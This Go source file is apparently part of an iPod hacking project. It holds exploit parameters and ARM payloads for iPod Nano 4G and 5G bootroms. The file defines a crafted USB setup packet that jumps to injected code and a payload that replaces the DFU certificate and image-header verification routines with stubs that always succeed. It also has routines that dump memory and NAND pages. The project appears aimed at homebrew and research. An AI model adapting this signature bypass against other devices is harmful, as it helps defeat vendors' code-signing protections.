package exploit

import (
	"github.com/freemyipod/wInd3x/pkg/uasm"
)

func haxedDFUN45G(ret1Addr uint32) []uasm.Statement {

	descriptorSRAM := 0x2202d800
	vtableSRAM := 0x2202d880

	return []uasm.Statement{
		// Copy descriptor to scratch memory space.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(descriptorSRAM)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.LabelRef("descriptor")},
		uasm.Ldrb{Dest: uasm.R2, Src: uasm.Deref(uasm.R1, 0)},

		uasm.Label("descriptor_copy_loop"),
		uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
		uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
		uasm.Sub{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
		uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("descriptor_copy_loop")},

		//// Set descriptor in g_State->dfu_state->deviceDescriptor
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2202fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 1584)},
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(descriptorSRAM)},
		uasm.Str{Src: uasm.R2, Dest: uasm.Deref(uasm.R0, 24)},

		// Copy state vtable to scratch.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2202fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 36)},
		uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(0)},
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(vtableSRAM)},

		uasm.Label("vtable_copy_loop"),
		uasm.Ldr{Dest: uasm.R3, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Str{Src: uasm.R3, Dest: uasm.Deref(uasm.R2, 0)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
		uasm.Cmp{A: uasm.R1, B: uasm.Immediate(84)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("vtable_copy_loop")},

		// Set new VTable in g_State.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2202fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(vtableSRAM)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 36)},

		// Overwrite VTable verify_{certificate,image_header} to no-ops.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(vtableSRAM)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(ret1Addr)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 28)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 20)},
	}
}

var epNano4G = &Parameters{
	DFUBufAddr: 0x2202db00,
	ExecAddr:   0x2202de08,
	USBBufAddr: 0x2202e300,

	TrampolineAddr: 0x3b0,
	// b 0x2202de08
	SetupPacket: []byte{0xc0, 0xfe, 0xff, 0xea, 0x03, 0x00, 0x00, 0x00},

	HandlerFooter: func(addr uint32) []uasm.Statement {
		return []uasm.Statement{
			// Return 0x40 bytes of requested address.
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(addr)},
			uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(0x40)},
			uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x2000a554)},
			uasm.Blx{Dest: uasm.R2},
			// Fixup LR (after trampoline blx messes it up)
			uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20004d64)},
			uasm.Bx{Dest: uasm.LR},
		}
	},
	AESCall:         makeCall(0x200020d4, 0x2202db00, 0x2202db00, 0x40, 1, 0, 0),
	HaxedDFUPayload: haxedDFUN45G(0x20000d10),
	DisableICache:   makeCall(0x200003f4),
}

var epNano5G = &Parameters{
	DFUBufAddr: 0x2202db00,
	ExecAddr:   0x2202de08,
	USBBufAddr: 0x2202e300,

	TrampolineAddr: 0x37c,
	// b 0x2202de08
	SetupPacket: []byte{0xc0, 0xfe, 0xff, 0xea, 0x03, 0x00, 0x00, 0x00},

	HandlerFooter: func(addr uint32) []uasm.Statement {
		return []uasm.Statement{
			// Return 0x40 bytes of requested address.
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(addr)},
			uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(0x40)},
			uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x2000a474)},
			uasm.Blx{Dest: uasm.R2},
			// Fixup LR (after trampoline blx messes it up)
			uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20004d70)},
			uasm.Bx{Dest: uasm.LR},
		}
	},
	AESCall:         makeCall(0x200020ec, 0x2202db00, 0x2202db00, 0x40, 1, 0, 0),
	HaxedDFUPayload: haxedDFUN45G(0x20000cbc),
	DisableICache:   makeCall(0x200003c0),

	NANDInit: []uasm.Statement{
		// enable clocks 5, 9
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x2000169c)},
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(5)},
		uasm.Blx{Dest: uasm.LR},
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x2000169c)},
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(9)},
		uasm.Blx{Dest: uasm.LR},
		// power up nand
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20001b3c)},
		uasm.Blx{Dest: uasm.LR},
		// reset nand bank 0
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(0)},
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20009060)},
		uasm.Blx{Dest: uasm.LR},
	},
	NANDReadPage: func(bank, page, offset uint32) []uasm.Statement {
		return []uasm.Statement{
			// reset nand bank
			uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(bank)},
			uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20009060)},
			uasm.Blx{Dest: uasm.LR},

			uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x200091e8)},
			uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(bank)},
			uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(page)},
			uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x22000000)},
			uasm.Blx{Dest: uasm.LR},

			uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2202db00)},
			uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x22000000)},
			uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(offset)},
			uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.R2},
			// Copy 0x40 bytes from R1 to R0.
			uasm.Mov{Dest: uasm.R2, Src: uasm.Immediate(0)},
			uasm.Label("loop"),
			uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
			uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
			uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
			uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
			uasm.Add{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
			uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0x40)},
			uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("loop")},
		}
	},
}
